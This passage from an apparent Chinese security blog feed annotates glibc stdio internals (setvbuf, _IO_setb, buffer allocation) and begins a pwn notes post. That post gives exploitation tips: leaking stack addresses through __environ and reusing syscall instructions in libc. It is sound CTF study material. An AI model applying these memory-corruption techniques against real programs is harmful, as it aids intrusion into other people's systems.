|= _IO_UNBUFFERED;<span class="comment">//设置nobuf</span></span><br><span class="line">_IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;<span class="comment">//取消nobuf标志</span></span><br><span class="line">_IO_setb (fp, p, p+len, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end = <span class="number">0</span>;<span class="comment">//清空rw缓存指针</span></span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+1, 0);</p><p>_IO_setb (fp, p, p+len, 0);</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))<span class="comment">//如果文件流存在buffer且不是保留buf模式</span></span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;<span class="comment">//buf缓冲区设置</span></span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;<span class="comment">//使文件流关闭时不处理buf</span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_setb)</span><br></pre></td></tr></table></figure><p>总结就是修改缓冲区及相应标志位再重置rw指针</p><h1 id="setvbuf"><a href="#setvbuf" class="headerlink" title="setvbuf"></a>setvbuf</h1><p> setvbuf</p><p>改变文件流 buffer 函数</p><p>指定对应文件流 stream 的 IO 操作 buffer，同时设定该块缓存 buffer 的操作 mode 和 size 大小，如果 buffer 指针是空指针，那么 setvbuf 函数将会自动分配一块默认大小大小的 buffer 作为缓存使用。</p><p>只有buf不为null时,size才有效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int setvbuf ( FILE * stream, char * buffer, int mode, size_t size );</span><br></pre></td></tr></table></figure><blockquote><p>注意：上面的 mode 有以下的选择</p></blockquote><ul><li>_IOFBF：Full Buffering:<strong>输出操作中</strong>，数据在 buffer 写满后写入物理文件；<strong>输入操作中</strong>，buffer 只有在全为空时才被填写，填充的可能是多行数据；</li><li>_IOLBF：Line Buffering:<strong>输出操作中</strong>，数据在新的一行插入 FILE 流对象或 buffer 写满时触发写入物理文件；<strong>输入操作中</strong>，buffer 只有在 buffer 全为空时，写入新的一行到 buffer 中。</li><li>_IONBF：No Buffering:不使用缓存 buffer，所有输入输出操作都尽可能快地写入物理文件，当前模式下，buffer 和 size 参数将会被忽略</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The possibilities for the third argument to `setvbuf&#x27;.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IOFBF 0<span class="comment">/* Fully buffered.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IOLBF 1<span class="comment">/* Line buffered.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IONBF 2<span class="comment">/* No buffering.  */</span></span></span><br></pre></td></tr></table></figure><blockquote><p>注意：setvbuf 的调用时机，在一个文件流对象绑定到一个打开的文件之后，对该文件流对象进行文件读写操作之前。</p></blockquote><p>可以看如下的例子：</p><p>打开了一个 pFIle 对象，并将其 buffer 设置为 NULL(函数内部将自动生成一块大小为 1024Byte 大小的 buffer)，mode 设置为_IOFBF。那么，在进行文件操作过程中，如向文件写入过程中，每写满 1024 字节才会触发一次将数据写入物理文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* setvbuf example */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *pFile;</span><br><span class="line"></span><br><span class="line">  pFile=fopen (<span class="string">&quot;myfile.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line"></span><br><span class="line">  setvbuf ( pFile , <span class="literal">NULL</span> , _IOFBF , <span class="number">1024</span> );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// File operations here</span></span><br><span class="line"></span><br><span class="line">  fclose (pFile);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>setvbuf调用的是_IO_setvbuf<br>函数位于libio/iosetvbuf.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_setvbuf (FILE *fp, <span class="type">char</span> *buf, <span class="type">int</span> mode, <span class="type">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line">  CHECK_FILE (fp, EOF);<span class="comment">//同样的校验</span></span><br><span class="line">  _IO_acquire_lock (fp);<span class="comment">//同样的上锁</span></span><br><span class="line">  <span class="keyword">switch</span> (mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> _IOFBF:<span class="comment">//全缓冲</span></span><br><span class="line">      fp-&gt;_flags &amp;= ~(_IO_LINE_BUF|_IO_UNBUFFERED);<span class="comment">//置空行缓冲和无缓冲标志</span></span><br><span class="line">      <span class="keyword">if</span> (buf == <span class="literal">NULL</span>)<span class="comment">//未指定buffer地址</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* There is no flag to distinguish between &quot;fully buffered</span></span><br><span class="line"><span class="comment"> mode has been explicitly set&quot; as opposed to &quot;line</span></span><br><span class="line"><span class="comment"> buffering has not been explicitly set&quot;.  In both</span></span><br><span class="line"><span class="comment"> cases, _IO_LINE_BUF is off.  If this is a tty, and</span></span><br><span class="line"><span class="comment"> _IO_filedoalloc later gets called, it cannot know if</span></span><br><span class="line"><span class="comment"> it should set the _IO_LINE_BUF flag (because that is</span></span><br><span class="line"><span class="comment"> the default), or not (because we have explicitly asked</span></span><br><span class="line"><span class="comment"> for fully buffered mode).  So we make sure a buffer</span></span><br><span class="line"><span class="comment"> gets allocated now, and explicitly turn off line</span></span><br><span class="line"><span class="comment"> buffering.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> A possibly cleaner alternative would be to add an</span></span><br><span class="line"><span class="comment"> extra flag, but then flags are a finite resource.  */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_DOALLOCATE (fp) &lt; <span class="number">0</span>)<span class="comment">//为其分配一块内存</span></span><br><span class="line">&#123;</span><br><span class="line">  result = EOF;</span><br><span class="line">  <span class="keyword">goto</span> unlock_return;</span><br><span class="line">&#125;</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_LINE_BUF;<span class="comment">//因为缓存分配函数默认会将行缓冲标志设为1,再次清空,可以看一下上面一大段英文</span></span><br><span class="line">    &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">goto</span> unlock_return;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> _IOLBF:</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;<span class="comment">//清空无缓冲标志</span></span><br><span class="line">      fp-&gt;_flags |= _IO_LINE_BUF;<span class="comment">//设置行缓冲模式</span></span><br><span class="line">      <span class="keyword">if</span> (buf == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">goto</span> unlock_return;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> _IONBF:</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_LINE_BUF;<span class="comment">//设置无缓冲标志</span></span><br><span class="line">      fp-&gt;_flags |= _IO_UNBUFFERED;<span class="comment">//清空行缓冲模式</span></span><br><span class="line">      buf = <span class="literal">NULL</span>;</span><br><span class="line">      size = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = EOF;</span><br><span class="line">      <span class="keyword">goto</span> unlock_return;</span><br><span class="line">    &#125;</span><br><span class="line">  result = _IO_SETBUF (fp, buf, size) == <span class="literal">NULL</span> ? EOF : <span class="number">0</span>;<span class="comment">//设置buf</span></span><br><span class="line"></span><br><span class="line">unlock_return:</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x1-IOFBF"><a href="#0x1-IOFBF" class="headerlink" title="0x1_IOFBF"></a>0x1_IOFBF</h2><ul><li>首先将_IO_LINE_BUF 和_IO_UNBUFFERED 位置为 0，因为目前是要求 full buffering 的；</li><li>然后我们检查输入参数 buf，如果为空的话，我们要尝试进行分配 buffer 分配；</li><li>再次我们检查 fp-&gt;_IO_buf_base 参数，这里指向的是 fp 预先分配的缓存 buffer，只有这里也为空，那就说明完全没有缓存 buffer 可用，那我们就真的需要进行分配了；</li><li>调用_IO_DOALLOCATE 对 fp 进行 buffer 分配</li><li>根据分配 buffer 是否失败决定是直接返回错误 EOF，还是重新只将_IO_LINE_BUF 置为 0</li><li><strong>注意了，上面都是 buf 为空，需要重新</strong></li><li><strong>分配的情况，如果 buf 不为空，那么我们会跳到</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = _IO_SETBUF (fp, buf, size) == NULL ? EOF : 0;</span><br></pre></td></tr></table></figure><p><strong>的执行中，进行 buf 设置；如果 fp-&gt;_IO_buf_base 不等于 NULL，那我们实际上是默认使用这块 buffer 的，返回 0，退出函数</strong></p><p>看一下其中的doalloc函数,位于libio/filedoallocate.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_doallocate (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">  size = BUFSIZ;<span class="comment">//默认size</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (S_ISCHR (st.st_mode))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">      DEV_TTY_P (&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      local_isatty (fp-&gt;_fileno))</span><br><span class="line">    fp-&gt;_flags |= _IO_LINE_BUF;<span class="comment">//设置行缓冲</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _STATBUF_ST_BLKSIZE</span></span><br><span class="line">      <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span> &amp;&amp; st.st_blksize &lt; BUFSIZ)</span><br><span class="line">size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  p = <span class="built_in">malloc</span> (size);<span class="comment">//申请</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (p == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  _IO_setb (fp, p, p + size, <span class="number">1</span>);<span class="comment">//设置缓冲区</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_doallocate)</span><br></pre></td></tr></table></figure><p>这个函数的核心作用就是为 fp-&gt;_IO_buf_base 分配一块合理大小的 buffer 用作缓存，我们来看看它的一些具体逻辑：</p><ul><li>默认 size 大小是 size = BUFSIZ （8192 字节）</li><li>对 fp 指针状态进行设置，将_IO_LINE_BUF 置位；</li><li>通过获取该 IO 流的 stat 信息 st，决定是否有必要采用其中 st_blksize 更新 size(主要是考虑使用一个比 8192 更小的 size，分配足够的就行，不一定要最大的 size)</li><li>通过 malloc 分配对应大小的 buffer，然后调用_IO_setb 将 fp-&gt;_IO_buf_base 设置为刚才申请的地址</li></ul><h2 id="0x2-IOLBF"><a href="#0x2-IOLBF" class="headerlink" title="0x2_IOLBF"></a>0x2_IOLBF</h2><p>这种情况是按行使用 buffer，主要做了以下操作：</p><ul><li>设置 tag，将_IO_UNBUFFERED 置 0，将_IO_LINE_BUF 置位；</li><li>如果入参 buf 为空，那就直接返回 0，结束函数；否则等待执行_IO_SETBUF (fp, buf, size)</li></ul><p><strong>思考：这里为什么不重新检查 fp-&gt;_IO_buf_base 然后分配内存呢？</strong></p><p>从上一种情况中我们注意到，在分配 buffer 后我们都默认将_IO_LINE_BUF 置位，即这是一种默认模式，所以我们无需检查 fp-&gt;_IO_buf_base 的状态</p><h2 id="0x3-IONBUF"><a href="#0x3-IONBUF" class="headerlink" title="0x3_IONBUF"></a>0x3_IONBUF</h2><p>这种情况的操作就更为简单了，禁用了 buffer，我们将_IO_LINE_BUF 置 0，_IO_UNBUFFERED 置位，然后将入参 buf 置为 NULL，size 置为 0，等待调用_IO_SETBUF (fp, buf, size)</p>]]></content>
    
    
    <summary type="html">fopen,fread,fwrite,fclose,setbuf.......</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="_IO_FILE" scheme="https://ixout.github.io/tags/IO-FILE/"/>
    
  </entry>
  
  <entry>
    <title>pwn杂烩</title>
    <link href="https://ixout.github.io/posts/25867/"/>
    <id>https://ixout.github.io/posts/25867/</id>
    <published>2023-09-14T11:09:20.000Z</published>
    <updated>2024-01-11T09:26:13.948Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GLIBC相关"><a href="#GLIBC相关" class="headerlink" title="GLIBC相关"></a>GLIBC相关</h1><h2 id="environ"><a href="#environ" class="headerlink" title="__environ"></a>__environ</h2><p>libc.so中存在一个符号<code>&#39;__environ&#39;</code></p><p>其存储的是main函数导出的envp参数的指针</p><p>因此可以通过其泄露栈地址,并以此获得栈上的各类数据地址</p><h2 id="read汇编"><a href="#read汇编" class="headerlink" title="read汇编"></a>read汇编</h2><p>在glibc中的read,write,open这些系统调用级调用函数<br>其汇编代码中都会存在syscall(0x0f05)</p><p>在无输出类题中会有妙用</p><h2 id="libc-start-main"><a href="#libc-start-main" class="headerlink" title="__libc_start_main"></a>__libc_start_main</h2><p>__libc_start_main函数</p><p>源码在glibc/csu/libc-start.c中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line">STATIC <span class="type">int</span></span><br><span class="line"><span class="title function_">LIBC_START_MAIN</span> <span class="params">(<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span></span><br><span class="line"><span class="params"> <span class="type">int</span> argc, <span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">#ifdef LIBC_START_MAIN_AUXVEC_ARG</span></span><br><span class="line"><span class="params"> ElfW(<span class="type">auxv_t</span>) *auxvec,</span></span><br><span class="line"><span class="params">#endif</span></span><br><span class="line"><span class="params"> __typeof (main) init,</span></span><br><span class="line"><span class="params"> <span class="type">void</span> (*fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params"> <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Result of the &#x27;main&#x27; function.  */</span></span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line"></span><br><span class="line">  __libc_multiple_libcs = &amp;_dl_starting_up &amp;&amp; !_dl_starting_up;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  _dl_relocate_static_pie ();</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> **ev = &amp;argv[argc + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  __environ = ev;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Store the lowest stack address.  This is done in ld.so if this is</span></span><br><span class="line"><span class="comment">     the code for the DSO.  */</span></span><br><span class="line">  __libc_stack_end = stack_end;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> HAVE_AUX_VECTOR</span></span><br><span class="line">  <span class="comment">/* First process the auxiliary vector since we need to find the</span></span><br><span class="line"><span class="comment">     program header to locate an eventually present PT_TLS entry.  */</span></span><br><span class="line"><span class="meta">#  <span class="keyword">ifndef</span> LIBC_START_MAIN_AUXVEC_ARG</span></span><br><span class="line">  ElfW(<span class="type">auxv_t</span>) *auxvec;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">char</span> **evp = ev;</span><br><span class="line">    <span class="keyword">while</span> (*evp++ != <span class="literal">NULL</span>)</span><br><span class="line">      ;</span><br><span class="line">    auxvec = (ElfW(<span class="type">auxv_t</span>) *) evp;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#  <span class="keyword">endif</span></span></span><br><span class="line">  _dl_aux_init (auxvec);</span><br><span class="line">  <span class="keyword">if</span> (GL(dl_phdr) == <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Starting from binutils-2.23, the linker will define the</span></span><br><span class="line"><span class="comment">         magic symbol __ehdr_start to point to our own ELF header</span></span><br><span class="line"><span class="comment">         if it is visible in a segment that also includes the phdrs.</span></span><br><span class="line"><span class="comment">         So we can set up _dl_phdr and _dl_phnum even without any</span></span><br><span class="line"><span class="comment">         information from auxv.  */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">extern</span> <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Ehdr)</span> __ehdr_start</span><br><span class="line">__<span class="title function_">attribute__</span> <span class="params">((weak, visibility (<span class="string">&quot;hidden&quot;</span>)))</span>;</span><br><span class="line">      <span class="keyword">if</span> (&amp;__ehdr_start != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          assert (__ehdr_start.e_phentsize == <span class="keyword">sizeof</span> *GL(dl_phdr));</span><br><span class="line">          GL(dl_phdr) = (<span class="type">const</span> <span class="type">void</span> *) &amp;__ehdr_start + __ehdr_start.e_phoff;</span><br><span class="line">          GL(dl_phnum) = __ehdr_start.e_phnum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize very early so that tunables can use it.  */</span></span><br><span class="line">  __libc_init_secure ();</span><br><span class="line"></span><br><span class="line">  __tunables_init (__environ);</span><br><span class="line"></span><br><span class="line">  ARCH_INIT_CPU_FEATURES ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Perform IREL&#123;,A&#125; relocations.  */</span></span><br><span class="line">  ARCH_SETUP_IREL ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The stack guard goes into the TCB, so initialize it early.  */</span></span><br><span class="line">  ARCH_SETUP_TLS ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In some architectures, IREL&#123;,A&#125; relocations happen after TLS setup in</span></span><br><span class="line"><span class="comment">     order to let IFUNC resolvers benefit from TCB information, e.g. powerpc&#x27;s</span></span><br><span class="line"><span class="comment">     hwcap and platform fields available in the TCB.  */</span></span><br><span class="line">  ARCH_APPLY_IREL ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set up the stack checker&#x27;s canary.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> THREAD_SET_STACK_GUARD</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  __stack_chk_guard = stack_chk_guard;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> DL_SYSDEP_OSCHECK</span></span><br><span class="line">  <span class="keyword">if</span> (!__libc_multiple_libcs)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This needs to run to initiliaze _dl_osversion before TLS</span></span><br><span class="line"><span class="comment"> setup might check it.  */</span></span><br><span class="line">      DL_SYSDEP_OSCHECK 